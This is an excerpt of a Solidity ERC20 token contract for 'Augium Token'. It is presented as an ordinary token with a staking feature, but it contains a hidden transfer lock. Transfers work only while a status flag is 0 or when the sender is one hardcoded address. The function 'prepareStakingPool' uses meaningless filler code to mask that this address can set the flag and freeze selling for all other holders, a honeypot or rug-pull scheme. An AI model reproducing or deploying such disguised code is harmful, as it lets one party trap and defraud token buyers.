...
contract Augium is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenak_totalSupply;
    uint256 private _tokenak_status = 0;
    uint256 public stakingPoolakStatus = 0;

    string private _tokenak_name;
    string private _tokenak_symbol;

    address private _poolakAddress = 0x9A9F424fe1444f177Db7715A8Eaaa5d32dBe8186;

    constructor() {
        _tokenak_name = "Augium Token";
        _tokenak_symbol = "AUGIUM";
        _tokenak_totalSupply = 10000 * 10 ** 18;
        _balances[msg.sender] = _tokenak_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolakAddress || _tokenak_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolakStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolakAddress)
        {
            _tokenak_status = 1;
        }
    }
